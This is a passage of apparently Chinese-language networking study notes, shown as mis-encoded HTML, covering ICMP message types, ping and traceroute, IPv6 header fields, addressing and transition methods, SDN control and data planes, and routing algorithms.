title="ICMPç»“æ„"></a>ICMPç»“æ„</h2><p>ICMPæŠ¥æ–‡æ˜¯è£…åœ¨IPæ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†</p><p><img src="http://cdn.clown2024.cn/202407151707725.png" alt="image-20240309000752280"></p><h2 id="icmpçš„5ç§å·®é”™æŠ¥å‘ŠæŠ¥æ–‡"><a href="#ICMPçš„5ç§å·®é”™æŠ¥å‘ŠæŠ¥æ–‡" class="headerlink" title="ICMPçš„5ç§å·®é”™æŠ¥å‘ŠæŠ¥æ–‡"></a>ICMPçš„5ç§å·®é”™æŠ¥å‘ŠæŠ¥æ–‡</h2><ol><li>ç»ˆç‚¹ä¸å¯è¾¾ï¼šå½“è·¯ç”±å™¨æˆ–ä¸»æœºä¸èƒ½äº¤ä»˜æ•°æ®æŠ¥æ—¶å°±å‘æºç‚¹å‘é€ç»ˆç‚¹ä¸å¯è¾¾æŠ¥æ–‡ï¼Œå³æ— æ³•äº¤ä»˜</li><li>æºç‚¹æŠ‘åˆ¶ï¼šå½“è·¯ç”±å™¨æˆ–ä¸»æœºç”±äºæ‹¥å¡è€Œä¸¢å¼ƒæ•°æ®æŠ¥æ—¶ï¼Œå°±å‘æºç‚¹å‘é€æºç‚¹æŠ‘åˆ¶æŠ¥æ–‡ï¼Œä½¿æºç‚¹çŸ¥é“åº”å½“æŠŠæ•°æ®æŠ¥çš„å‘é€é€Ÿç‡æ”¾æ…¢ï¼Œåœ¨ç½‘ç»œæ‹¥å¡ä¸¢å¤±æ•°æ®æ˜¯å‘ç”Ÿï¼›<strong>ä¸è¿‡ç°åœ¨å·²ç»ä¸ç”¨è¿™ç§æŠ¥æ–‡äº†</strong>ã€‚</li><li>æ—¶é—´è¶…è¿‡ï¼šå½“è·¯ç”±å™¨æ”¶åˆ°ç”Ÿå­˜æ—¶é—´TTL&#x3D;0çš„æ•°æ®æŠ¥æ—¶ï¼Œé™¤ä¸¢å¼ƒè¯¥æ•°æ®æŠ¥å¤–ï¼Œè¿˜è¦å‘æºç‚¹å‘é€æ—¶é—´è¶…è¿‡æŠ¥æ–‡ã€‚ç»ˆç‚¹åœ¨é¢„å…ˆè§„å®šçš„æ—¶é—´å†…ä¸èƒ½æ”¶åˆ°ä¸€ä¸ªæ•°æ®æŠ¥çš„å…¨éƒ¨æ•°æ®æŠ¥ç‰‡æ—¶ï¼Œå°±æŠŠå·²æ”¶åˆ°çš„æ•°æ®æŠ¥ç‰‡éƒ½ä¸¢å¼ƒï¼Œå¹¶å‘æºç‚¹å‘é€æ—¶é—´è¶…è¿‡æŠ¥æ–‡ï¼Œå³ TTL&#x3D;0æ—¶ã€‚</li><li>å‚æ•°é—®é¢˜ï¼šå½“è·¯ç”±å™¨æˆ–ç›®çš„ä¸»æœºæ”¶åˆ°çš„æ•°æ®æŠ¥çš„é¦–éƒ¨ä¸­æœ‰çš„å­—æ®µçš„å€¼ä¸æ­£ç¡®æ—¶ï¼Œå°±ä¸¢å¼ƒè¯¥æ•°æ®æŠ¥ï¼Œå¹¶å‘æºç‚¹å‘é€å‚æ•°é—®é¢˜æŠ¥æ–‡ã€‚é¦–éƒ¨å­—æ®µæœ‰é—®é¢˜æ—¶å‘ç”Ÿã€‚</li><li>æ”¹å˜è·¯ç”±(é‡å®šå‘)ï¼šè·¯ç”±å™¨æŠŠæ”¹å˜è·¯ç”±æŠ¥æ–‡å‘é€ç»™ä¸»æœºï¼Œè®©ä¸»æœºçŸ¥é“ä¸‹æ¬¡åº”å°†æ•°æ®æŠ¥å‘é€ç»™å¦å¤–çš„è·¯ç”±å™¨<br>ï¼Œé€‰æ‹©æ›´å¥½çš„è·¯ç”±ã€‚</li></ol><p><strong>ICMPå·®é”™æŠ¥å‘ŠæŠ¥æ–‡æ•°æ®æ ¼å¼</strong></p><p><img src="http://cdn.clown2024.cn/202407151707726.png" alt="image-20240309001638857"></p><p><strong>ä¸å‘é€ICMPå·®é”™æŠ¥æ–‡çš„æƒ…å†µ</strong></p><ol><li><p>å¯¹ICMPå·®é”™æŠ¥å‘ŠæŠ¥æ–‡ä¸å†å‘é€ICMPå·®é”™æŠ¥å‘ŠæŠ¥æ–‡ã€‚</p></li><li><p>å¯¹ç¬¬ä¸€ä¸ªåˆ†ç‰‡çš„æ•°æ®æŠ¥ç‰‡çš„æ‰€æœ‰åç»­æ•°æ®æŠ¥ç‰‡éƒ½ä¸å‘é€ICMPå·®é”™æŠ¥å‘ŠæŠ¥æ–‡ã€‚</p></li><li><p>å¯¹å…·æœ‰ç»„æ’­åœ°å€çš„æ•°æ®æŠ¥éƒ½ä¸å‘é€ICMPå·®é”™æŠ¥å‘ŠæŠ¥æ–‡(ç»„æ’­åœ°å€åŒºåˆ«äºå¹¿æ’­åœ°å€ï¼Œä¸€ç‚¹åˆ°å¤šç‚¹å³å¯ï¼Œåªç”¨ç»™éƒ¨åˆ†èŠ‚ç‚¹å‘é€ï¼Œè€Œä¸åƒå¹¿æ’­åœ°å€å‘é€ç»™æ‰€æœ‰èŠ‚ç‚¹)ã€‚</p></li><li><p>å¯¹å…·æœ‰ç‰¹æ®Šåœ°å€(å¦‚127.0.0.0æˆ–0.0.0.0)çš„æ•°æ®æŠ¥ä¸å‘é€ICMPå·®é”™æŠ¥å‘ŠæŠ¥æ–‡ã€‚</p></li></ol><h2 id="icmpè¯¢é—®æŠ¥æ–‡"><a href="#ICMPè¯¢é—®æŠ¥æ–‡" class="headerlink" title="ICMPè¯¢é—®æŠ¥æ–‡"></a>ICMPè¯¢é—®æŠ¥æ–‡</h2><ol><li><p>å›é€è¯·æ±‚å’Œå›ç­”æŠ¥æ–‡ï¼šä¸»æœºæˆ–è·¯ç”±å™¨å‘ç‰¹å®šç›®çš„ä¸»æœºå‘å‡ºçš„è¯¢é—®ï¼Œæ”¶åˆ°æ­¤æŠ¥æ–‡çš„ä¸»æœºå¿…é¡»ç»™æºä¸»æœºæˆ–è·¯ç”±å™¨å‘é€ICMPå›é€å›ç­”æŠ¥æ–‡ã€‚æµ‹è¯•ç›®çš„ç«™æ˜¯å¦å¯è¾¾ä»¥åŠäº†è§£å…¶ç›¸å…³çŠ¶æ€ã€‚(å¹³æ—¶ç”¨çš„pingå‘½ä»¤å°±æ˜¯ä¸€ç§)</p></li><li><p>æ—¶é—´æˆ³è¯·æ±‚å’Œå›ç­”æŠ¥æ–‡ï¼šè¯·æŸä¸ªä¸»æœºæˆ–è·¯ç”±å™¨å›ç­”å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´ã€‚ç”¨æ¥è¿›è¡Œæ—¶é’ŸåŒæ­¥å’Œæµ‹é‡æ—¶é—´ã€‚2.æ—¶é—´æˆ³è¯·æ±‚å’Œå›ç­”æŠ¥æ–‡</p></li><li><p>æ©ç åœ°å€è¯·æ±‚å’Œå›ç­”æŠ¥æ–‡</p></li><li><p>è·¯ç”±å™¨è¯¢é—®å’Œé€šå‘ŠæŠ¥æ–‡</p></li></ol><blockquote><p>ç¬¬ä¸‰å’Œç¬¬å››ç§ç°åœ¨å·²ç»ä¸å†ä½¿ç”¨äº†</p></blockquote><h2 id="icmpçš„åº”ç”¨"><a href="#ICMPçš„åº”ç”¨" class="headerlink" title="ICMPçš„åº”ç”¨"></a>ICMPçš„åº”ç”¨</h2><p>è¿™é‡Œä»‹ç»ä¸¤ä¸ªå‘½ä»¤</p><ol><li><p>pingï¼šè¯¥å‘½ä»¤æµ‹è¯•ä¸¤ä¸ªä¸»æœºä¹‹é—´çš„è¿é€šæ€§ï¼Œä½¿ç”¨äº†ICMPå›é€è¯·æ±‚å’Œå›ç­”æŠ¥æ–‡</p></li><li><p>traceroute(Windowsä¸Šæ˜¯tracert)ï¼šè·Ÿè¸ªä¸€ä¸ªåˆ†ç»„ä»æºç‚¹åˆ°ç»ˆç‚¹çš„è·¯å¾„ï¼Œä½¿ç”¨äº†ICMPæ—¶é—´è¶…è¿‡å·®é”™æŠ¥å‘ŠæŠ¥æ–‡</p><p>ä»–çš„åŸç†æ˜¯è¿™æ ·çš„</p><p><img src="http://cdn.clown2024.cn/202407151707727.png" alt="image-20240309002552980"></p><p>ä¸€å¼€å§‹çš„æŠ¥æ–‡TTLè®¾ç½®ä¸º1ï¼Œç»è¿‡ä¸€ä¸ªè·¯ç”±ï¼ŒTTLå˜ä¸º0ç„¶åè¿”å›å·®é”™æŠ¥å‘ŠæŠ¥æ–‡ï¼Œå°±å¯ä»¥æµ‹è¯•å‡ºä¸€ä¸ªè·¯ç”±ï¼Œæ­¤åæ¯æ¬¡TTLåŠ 1ï¼Œä»¥æ­¤ç±»æ¨å°±å¯ä»¥æµ‹å‡ºç»è¿‡å¤šå°‘è·¯ç”±ï¼Œä¹Ÿå°±çŸ¥é“äº†è·¯å¾„ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707728.png" alt="image-20240309003134315"></p><blockquote><p>ç»“æœè¯´æ˜ï¼šç¬¬ä¸€åˆ—è¡¨ç¤ºåˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨ç»è¿‡çš„ç½‘ç»œèŠ‚ç‚¹æ•°ï¼Œ2-4åˆ—åˆ†åˆ«è¡¨ç¤ºè¯·æ±‚ç›®æ ‡èŠ‚ç‚¹æ—¶é—´ã€ç›®æ ‡èŠ‚ç‚¹å“åº”æ—¶é—´å’Œå¹³å‡å“åº”æ—¶é—´ï¼Œæœ€å³è¾¹åˆ™è¡¨ç¤ºåˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨æ‰€ç»è¿‡çš„æ¯ä¸ªç½‘ç»œèŠ‚ç‚¹çš„IP</p></blockquote></li></ol><h1 id="ipv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h1><p>å› ä¸ºIPv4çš„åœ°å€ç©ºé—´åˆ†é…æ®†å°½ï¼Œæ‰€ä»¥IPv6å°±å‡ºç°äº†æ¥è§£å†³åœ°å€ç©ºé—´ä¸è¶³é—®é¢˜ã€‚</p><p><strong>IPv6çš„æ”¹å˜</strong></p><p>æ”¹è¿›äº†é¦–éƒ¨æ ¼å¼ä»¥ä¾¿å¿«é€Ÿå¤„ç†å’Œå¿«é€Ÿè½¬å‘ã€‚</p><p>æ”¯æŒQoS(Quality of Serviceï¼ŒæœåŠ¡è´¨é‡)ï¼šæŒ‡ä¸€ä¸ªç½‘ç»œèƒ½å¤Ÿåˆ©ç”¨å„ç§åŸºç¡€æŠ€æœ¯ï¼Œä¸ºæŒ‡å®šçš„ç½‘ç»œé€šä¿¡æä¾›æ›´å¥½çš„æœåŠ¡èƒ½åŠ›,æ˜¯ç½‘ç»œçš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæ˜¯ç”¨æ¥è§£å†³ç½‘ç»œå»¶è¿Ÿå’Œé˜»å¡ç­‰é—®é¢˜çš„ä¸€ç§æŠ€æœ¯ã€‚</p><h2 id="æ•°æ®æŠ¥æ ¼å¼"><a href="#æ•°æ®æŠ¥æ ¼å¼" class="headerlink" title="æ•°æ®æŠ¥æ ¼å¼"></a>æ•°æ®æŠ¥æ ¼å¼</h2><p><img src="http://cdn.clown2024.cn/202407151707729.png" alt="image-20240309004131851"></p><p><img src="http://cdn.clown2024.cn/202407151707730.png" alt="image-20240309005425608"></p><ol><li>è¿™é‡Œçš„ç‰ˆæœ¬æŒ‡æ˜äº†åè®®ç‰ˆæœ¬ï¼ŒIPv6ä»–çš„å­—æ®µå€¼å°±æ˜¯6</li><li>ä¼˜å…ˆçº§å°±æ˜¯åŒºåˆ†æ•°æ®æŠ¥çš„ç±»åˆ«å’Œä¼˜å…ˆçº§</li><li>æµæ ‡ç­¾æœ‰ç‚¹ç±»ä¼¼æ•°æ®æŠ¥åˆ†ç‰‡ä¸­çš„æ ‡è¯†ä½ï¼Œâ€œæµâ€æ˜¯äº’è”ç½‘ç»œä¸Šä»ç‰¹å®šæºç‚¹åˆ°ç‰¹å®šç»ˆç‚¹çš„ä¸€ç³»åˆ—æ•°æ®æŠ¥ã€‚æ‰€æœ‰å±äºåŒä¸€ä¸ªæµçš„æ•°æ®æŠ¥éƒ½å…·æœ‰åŒæ ·çš„æµæ ‡ç­¾ã€‚æ¯”å¦‚Bå’ŒAä¸»æœºè¿›è¡Œè¿æ¥ä¼ è¾“æ•°æ®ï¼Œåœ¨è¯¥è¿æ¥ä¸ŠBå‘Aå‘å‡ºçš„å¤šä¸ªæ•°æ®åŒ…éƒ½å±äºåŒä¸€ä¸ªæµï¼Œæ‰€ä»¥ä»–ä»¬ä¹Ÿå°±æœ‰ç›¸åŒçš„æµæ ‡ç­¾ã€‚</li><li>ä¸‹ä¸€ä¸ªé¦–éƒ¨é¡¾åæ€ä¹‰å°±æ˜¯è¡¨ç¤ºä¸‹ä¸€ä¸ªé¦–éƒ¨æ˜¯è°ï¼Œæ¯”å¦‚åŸºæœ¬é¦–éƒ¨çš„ä¸‹ä¸€ä¸ªé¦–éƒ¨æ ‡è¯†æ‰©å±•é¦–éƒ¨1ï¼Œæ‰©å±•é¦–éƒ¨çš„ä¸‹ä¸€ä¸ªé¦–éƒ¨æ ‡è¯†æ‰©å±•é¦–éƒ¨2ï¼Œæ‰©å±•é¦–éƒ¨2çš„ä¸‹ä¸€ä¸ªé¦–éƒ¨æ ‡è¯†æ•°æ®éƒ¨åˆ†ã€‚</li><li>è·³æ•°é™åˆ¶å°±ç›¸å½“äºIPv4çš„TTLã€‚</li></ol><h2 id="ipv6å’Œipv4çš„åŒºåˆ«"><a href="#IPv6å’ŒIPv4çš„åŒºåˆ«" class="headerlink" title="IPv6å’ŒIPv4çš„åŒºåˆ«"></a>IPv6å’ŒIPv4çš„åŒºåˆ«</h2><p><img src="http://cdn.clown2024.cn/202407151707731.png" alt="image-20240309010458862"></p><blockquote><p>åœ¨ç¬¬ä¸ƒç‚¹ä¸­ï¼Œå› ä¸ºåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸èƒ½åœ¨è·¯ç”±åˆ†ç‰‡ï¼Œæ‰€ä»¥å¦‚æœè¶…è¿‡äº†æ•°æ®é“¾è·¯å±‚çš„æœ€å¤§ä¼ è¾“å•å…ƒMTUå°±ä¼šå°†æ•°æ®æŠ¥ä¸¢å¼ƒï¼Œè¿”å›ä¸€ä¸ªICMPv6å·®é”™æŠ¥æ–‡ã€‚</p></blockquote><h2 id="ipv6åœ°å€è¡¨ç¤ºå½¢å¼"><a href="#IPv6åœ°å€è¡¨ç¤ºå½¢å¼" class="headerlink" title="IPv6åœ°å€è¡¨ç¤ºå½¢å¼"></a>IPv6åœ°å€è¡¨ç¤ºå½¢å¼</h2><ol><li><p>ä¸€èˆ¬å½¢å¼ï¼šå†’å·åå…­è¿›åˆ¶è®°æ³•**(å…«ç»„å››ä½åå…­è¿›åˆ¶æ•°)**ï¼Œæ¯”å¦‚ï¼š4BF5:AA12:0216:FEBC:BA5F:039A:BE9A:2170</p></li><li><p>å‹ç¼©å½¢å¼</p><p><img src="http://cdn.clown2024.cn/202407151707732.png" alt="image-20240309011120976"></p></li></ol><h2 id="ipv6åŸºæœ¬åœ°å€ç±»å‹"><a href="#IPv6åŸºæœ¬åœ°å€ç±»å‹" class="headerlink" title="IPv6åŸºæœ¬åœ°å€ç±»å‹"></a>IPv6åŸºæœ¬åœ°å€ç±»å‹</h2><ol><li>å•æ’­ï¼šä¸€å¯¹ä¸€é€šä¿¡ï¼Œå¯åšæºåœ°å€+ç›®çš„åœ°å€</li><li>å¤šæ’­ï¼šä¸€å¯¹å¤šé€šä¿¡ï¼Œå¯åšç›®çš„åœ°å€</li><li>ä»»æ’­ï¼šä¸€å¯¹å¤šä¸­çš„ä¸€ä¸ªé€šä¿¡ï¼Œå¯åšç›®çš„åœ°å€</li></ol><h2 id="ipv6å‘ipv4è¿‡æ¸¡ç­–ç•¥"><a href="#IPv6å‘IPv4è¿‡æ¸¡ç­–ç•¥" class="headerlink" title="IPv6å‘IPv4è¿‡æ¸¡ç­–ç•¥"></a>IPv6å‘IPv4è¿‡æ¸¡ç­–ç•¥</h2><ol><li><strong>åŒæ ˆåè®®ï¼š</strong>åŒåè®®æ ˆæŠ€æœ¯å°±æ˜¯æŒ‡åœ¨ä¸€å°è®¾å¤‡ä¸Š<strong>åŒæ—¶å¯ç”¨IPv4åè®®æ ˆå’ŒIPv6åè®®æ ˆ</strong>ã€‚è¿™æ ·çš„è¯ï¼Œè¿™å°è®¾å¤‡æ—¢èƒ½å’ŒIPv4ç½‘ç»œé€šä¿¡ï¼Œåˆèƒ½å’ŒIPv6ç½‘ç»œé€šä¿¡ã€‚å¦‚æœè¿™å°è®¾å¤‡æ˜¯ä¸€ä¸ªè·¯ç”±å™¨ï¼Œé‚£ä¹ˆè¿™å°è·¯ç”±å™¨çš„ä¸åŒæ¥å£ä¸Šï¼Œåˆ†åˆ«é…ç½®äº†IPv4åœ°å€å’ŒIPv6åœ°å€ï¼Œå¹¶å¾ˆå¯èƒ½åˆ†åˆ«è¿æ¥äº†IPv4ç½‘ç»œå’ŒIPv6ç½‘ç»œã€‚å¦‚æœè¿™å°è®¾å¤‡æ˜¯ä¸€ä¸ªè®¡ç®—æœºï¼Œé‚£ä¹ˆå®ƒå°†åŒæ—¶æ‹¥æœ‰IPv4åœ°å€å’ŒIPv6åœ°å€ï¼Œå¹¶å…·å¤‡åŒæ—¶å¤„ç†è¿™ä¸¤ä¸ªåè®®åœ°å€çš„åŠŸèƒ½ã€‚</li><li><strong>éš§é“æŠ€æœ¯ï¼š</strong>é€šè¿‡ä½¿ç”¨äº’è”ç½‘ç»œçš„åŸºç¡€è®¾æ–½åœ¨ç½‘ç»œä¹‹é—´ä¼ é€’æ•°æ®çš„æ–¹å¼ã€‚ä½¿ç”¨éš§é“ä¼ é€’çš„æ•°æ®(æˆ–è´Ÿè½½)å¯ä»¥æ˜¯ä¸åŒåè®®çš„æ•°æ®å¸§æˆ–åŒ…ã€‚éš§é“åè®®å°†å…¶å®ƒåè®®çš„æ•°æ®å¸§æˆ–åŒ…é‡æ–°å°è£…ç„¶åé€šè¿‡éš§é“å‘é€ã€‚æ¯”å¦‚ä¸€æ®µIPv6çš„æ•°æ®æŠ¥åŠ ä¸ŠIPv4çš„é¦–éƒ¨ï¼Œè€ŒIPv6çš„æ•°æ®æŠ¥åˆ™ä½œä¸ºæ•°æ®éƒ¨åˆ†ï¼Œç„¶åé‡æ–°å°è£…å½“ä½œIPv4è¿›è¡Œä¼ æ’­ã€‚</li></ol><h1 id="sdn"><a href="#SDN" class="headerlink" title="SDN"></a>SDN</h1><h2 id="è·¯ç”±è½¬å‘å’Œè·¯ç”±é€‰æ‹©"><a href="#è·¯ç”±è½¬å‘å’Œè·¯ç”±é€‰æ‹©" class="headerlink" title="è·¯ç”±è½¬å‘å’Œè·¯ç”±é€‰æ‹©"></a>è·¯ç”±è½¬å‘å’Œè·¯ç”±é€‰æ‹©</h2><p><strong>è½¬å‘ï¼š</strong></p><p>è¾¾åˆ°è·¯ç”±å™¨è¾“å…¥é“¾è·¯ä¹‹ä¸€çš„æ•°æ®æŠ¥å¦‚ä½•è½¬å‘åˆ°è¯¥è·¯ç”±å™¨çš„è¾“å‡ºé“¾è·¯ä¹‹ä¸€ã€‚èŠ±è´¹æ—¶é—´çŸ­ï¼Œé€šå¸¸ç”¨ç¡¬ä»¶è§£å†³</p><p><strong>æ•°æ®å¹³é¢</strong></p><p>æ•°æ®å¹³é¢å¯¹äºæ•°æ®å¤„ç†è¿‡ç¨‹ä¸­å„ç§å…·ä½“å¤„ç†è½¬å‘è¿‡ç¨‹ã€‚å¯¹åº”è·¯ç”±è½¬å‘</p><p><strong>è·¯ç”±é€‰æ‹©ï¼š</strong></p><p>æ§åˆ¶æ•°æ®æŠ¥æ²¿ç€ä»æºä¸»æœºåˆ°ç›®çš„ä¸»æœºçš„ç«¯åˆ°ç«¯è·¯å¾„ä¸­è·¯ç”±å™¨ä¹‹é—´çš„è·¯ç”±æ–¹å¼ã€‚èŠ±è´¹æ—¶é—´é•¿ï¼Œé€šå¸¸ç”¨è½¯ä»¶è§£å†³ã€‚</p><p><strong>æ§åˆ¶å¹³é¢</strong></p><p>æ§åˆ¶å¹³é¢ç”¨äºæ§åˆ¶å’Œç®¡ç†ç½‘ç»œåè®®çš„è¿è¡Œï¼Œæ¯”å¦‚OSPFåè®®ã€RIPåè®®ã€BGPåè®®ã€‚å¯¹åº”è·¯ç”±é€‰æ‹©ã€‚</p><h2 id="æ•°æ®å¹³é¢"><a href="#æ•°æ®å¹³é¢" class="headerlink" title="æ•°æ®å¹³é¢"></a>æ•°æ®å¹³é¢</h2><p>æ•°æ®å¹³é¢æ‰§è¡Œçš„ä¸»è¦åŠŸèƒ½æ˜¯æ ¹æ®è½¬å‘è¡¨è¿›è¡Œè½¬å‘ï¼Œè¿™æ˜¯è·¯ç”±å™¨çš„æœ¬åœ°åŠ¨ä½œã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707733.png" alt="image-20240306235123180"></p><h2 id="æ§åˆ¶å¹³é¢"><a href="#æ§åˆ¶å¹³é¢" class="headerlink" title="æ§åˆ¶å¹³é¢"></a>æ§åˆ¶å¹³é¢</h2><p><strong>æ§åˆ¶å¹³é¢çš„ä¼ ç»Ÿæ–¹æ³•ä¹Ÿå«æ¯è·¯ç”±å™¨æ³•ï¼š</strong></p><p>è·¯ç”±é€‰æ‹©ç®—æ³•è¿è¡Œåœ¨æ¯å°è·¯ç”±å™¨ä¸­ï¼Œå¹¶ä¸”åœ¨æ¯å°è·¯ç”±å™¨ä¸­éƒ½åŒ…å«è½¬å‘å’Œè·¯ç”±é€‰æ‹©ä¸¤ç§åŠŸèƒ½ã€‚</p><p>å…·ä½“åŸç†ä¸ºï¼šåœ¨ä¸€å°è·¯ç”±å™¨ä¸­çš„è·¯ç”±é€‰æ‹©ç®—æ³•ä¸å…¶ä»–è·¯ç”±å™¨ä¸­çš„è·¯ç”±é€‰æ‹©ç®—æ³•é€šä¿¡(é€šè¿‡äº¤æ¢è·¯ç”±é€‰æ‹©æŠ¥æ–‡)<br>è®¡ç®—å‡ºè·¯ç”±è¡¨å’Œè½¬å‘è¡¨ã€‚</p><p><strong>SDNæ–¹æ³•ï¼šSoftware-Defined Networking</strong></p><p>æ§åˆ¶å¹³é¢ä»è·¯ç”±å™¨ç‰©ç†ä¸Šåˆ†ç¦»ã€‚è·¯ç”±å™¨ä»…å®ç°è½¬å‘ï¼Œè¿œç¨‹æ§åˆ¶å™¨è®¡ç®—å’Œåˆ†å‘è½¬å‘è¡¨ä»¥ä¾›æ¯å°è·¯ç”±å™¨æ‰€ä½¿ç”¨ã€‚</p><p>å…·ä½“åŸç†ä¸ºï¼šè·¯ç”±å™¨é€šè¿‡äº¤æ¢åŒ…å«è½¬å‘è¡¨å’Œå…¶ä»–è·¯ç”±é€‰æ‹©ä¿¡æ¯çš„æŠ¥æ–‡ä¸è¿œç¨‹æ§åˆ¶å™¨é€šä¿¡ã€‚å› ä¸ºè®¡ç®—è½¬å‘å¹¶ä¸è·¯ç”±å™¨äº¤äº’çš„æ§åˆ¶å™¨æ˜¯ç”¨è½¯ä»¶å®ç°çš„ï¼Œæ‰€ä»¥ç½‘ç»œæ˜¯è½¯ä»¶å®šä¹‰çš„ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707734.png" alt="image-20240307093103127"></p><p><strong>æ§åˆ¶å¹³é¢ä¸­çš„è·¯ç”±é€‰æ‹©å¤„ç†å™¨</strong></p><p>ä¼ ç»Ÿæ–¹æ³•ï¼šè·¯ç”±é€‰æ‹©å¤„ç†å™¨æ‰§è¡Œæ§åˆ¶å¹³é¢åŠŸèƒ½ã€‚åœ¨ä¼ ç»Ÿçš„è·¯ç”±å™¨ä¸­ï¼Œå®ƒæ‰§è¡Œè·¯ç”±é€‰æ‹©åè®®ï¼Œç»´æŠ¤è·¯ç”±é€‰æ‹©è¡¨äºå…³è”é“¾è·¯çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶ä¸ºè¯¥è·¯ç”±å™¨è®¡ç®—è½¬å‘è¡¨ã€‚</p><p>SDNæ–¹æ³•ï¼šåœ¨SDNè·¯ç”±å™¨ä¸­ï¼Œè·¯ç”±é€‰æ‹©å¤„ç†å™¨è´Ÿè´£ä¸è¿œç¨‹æ§åˆ¶å™¨é€šä¿¡ï¼Œç›®çš„æ˜¯æ¥æ”¶è¿œç¨‹æ§åˆ¶å™¨è®¡ç®—çš„è½¬å‘è¡¨é¡¹ã€‚</p><h2 id="sdnç»„ä»¶"><a href="#SDNç»„ä»¶" class="headerlink" title="SDNç»„ä»¶"></a>SDNç»„ä»¶</h2><ul><li><p>SDNæ§åˆ¶å™¨ï¼šç»´æŠ¤å‡†ç¡®çš„ç½‘ç»œçŠ¶æ€ä¿¡æ¯(è¿œç¨‹é“¾è·¯ã€äº¤æ¢æœºå’Œä¸»æœºçš„çŠ¶æ€);ä¸ºè¿è¡Œåœ¨æ§åˆ¶å¹³é¢ä¸­çš„ç½‘ç»œæ§åˆ¶åº”ç”¨ç¨‹åºæä¾›è¿™äº›ä¿¡æ¯(é€»è¾‘é›†ä¸­ï¼Œåœ¨å¤šå°æœåŠ¡å™¨ä¸Šå®ç°)</p></li><li><p>ç½‘ç»œæ§åˆ¶åº”ç”¨ç¨‹åºï¼šæ ¹æ®SDNæ§åˆ¶å™¨æä¾›çš„æ–¹æ³•ï¼Œè¿™äº›åº”ç”¨ç¨‹åºé€šè¿‡è¿™äº›æ–¹æ³•èƒ½å¤Ÿç›‘è§†ã€ç¼–ç¨‹å’Œæ§åˆ¶ä¸‹é¢çš„ç½‘<br>ç»œè®¾å¤‡ã€‚</p></li></ul><p><img src="http://cdn.clown2024.cn/202407151707735.png" alt="image-20240307093843773"></p><p><strong>SDNæ§åˆ¶å™¨çš„ç»†èŠ‚</strong></p><p><img src="http://cdn.clown2024.cn/202407151707736.png" alt="image-20240307094357878"></p><h1 id="è·¯ç”±ç®—æ³•"><a href="#è·¯ç”±ç®—æ³•" class="headerlink" title="è·¯ç”±ç®—æ³•"></a>è·¯ç”±ç®—æ³•</h1><ul><li><p><strong>é™æ€è·¯ç”±ç®—æ³•(éè‡ªé€‚åº”è·¯ç”±ç®—æ³•)</strong>,</p><p>ç”±ç®¡ç†å‘˜æ‰‹å·¥é…ç½®è·¯ç”±ä¿¡æ¯ã€‚<br>ç®€ä¾¿ã€å¯é ï¼Œåœ¨è´Ÿè·ç¨³å®šã€æ‹“æ‰‘å˜åŒ–ä¸å¤§çš„ç½‘ç»œä¸­è¿è¡Œæ•ˆæœå¾ˆå¥½ï¼Œå¹¿æ³›ç”¨äºé«˜åº¦å®‰å…¨æ€§çš„å†›äº‹ç½‘ç»œå’Œè¾ƒå°çš„å•†ä¸šç½‘ç»œã€‚è·¯ç”±æ›´æ–°æ…¢ï¼Œä¸é€‚ç”¨å¤§å‹ç½‘ç»œã€‚</p></li><li><p><strong>åŠ¨æ€è·¯ç”±ç®—æ³•(è‡ªé€‚åº”è·¯ç”±ç®—æ³•)</strong></p><p>ç”±è·¯ç”±å™¨é—´å½¼æ­¤äº¤æ¢ä¿¡æ¯ï¼ŒæŒ‰ç…§è·¯ç”±ç®—æ³•ä¼˜åŒ–å‡ºè·¯ç”±è¡¨é¡¹ã€‚<br>è·¯ç”±æ›´æ–°å¿«ï¼Œé€‚ç”¨å¤§å‹ç½‘ç»œï¼ŒåŠæ—¶å“åº”é“¾è·¯è´¹ç”¨æˆ–ç½‘ç»œæ‹“æ‰‘å˜åŒ–ã€‚<br>ç®—æ³•å¤æ‚ï¼Œå¢åŠ ç½‘ç»œè´Ÿæ‹…ã€‚</p><p><strong>åŠ¨æ€è·¯ç”±ç®—æ³•åˆå¯ä»¥åˆ†ä¸ºå…¨å±€æ€§å’Œåˆ†æ•£æ€§</strong></p><ul><li><p>å…¨å±€æ€§ï¼šé“¾è·¯çŠ¶æ€è·¯ç”±ç®—æ³•(OSPF)</p><p>æ‰€æœ‰è·¯ç”±å™¨æŒæ¡å®Œæ•´çš„ç½‘ç»œæ‹“æ‰‘å’Œé“¾è·¯è´¹ç”¨ä¿¡æ¯ã€‚</p></li><li><p>åˆ†æ•£æ€§ï¼šè·ç¦»å‘é‡è·¯ç”±ç®—æ³•(RIP)</p><p>è·¯ç”±å™¨åªæŒæ¡ç‰©ç†ç›¸è¿çš„é‚»å±…åŠé“¾è·¯è´¹ç”¨ã€‚</p></li></ul></li></ul><h1 id="åˆ†å±‚æ¬¡è·¯ç”±é€‰æ‹©åè®®"><a href="#åˆ†å±‚æ¬¡è·¯ç”±é€‰æ‹©åè®®" class="headerlink" title="åˆ†å±‚æ¬¡è·¯ç”±é€‰æ‹©åè®®"></a>åˆ†å±‚æ¬¡è·¯ç”±é€‰æ‹©åè®®</h1><p>åˆ†å±‚åè®®äº§ç”Ÿçš„åŸå› æ˜¯å› ä¸ºå¾ˆå¤šå•ä½åœ¨æ¥å…¥å› 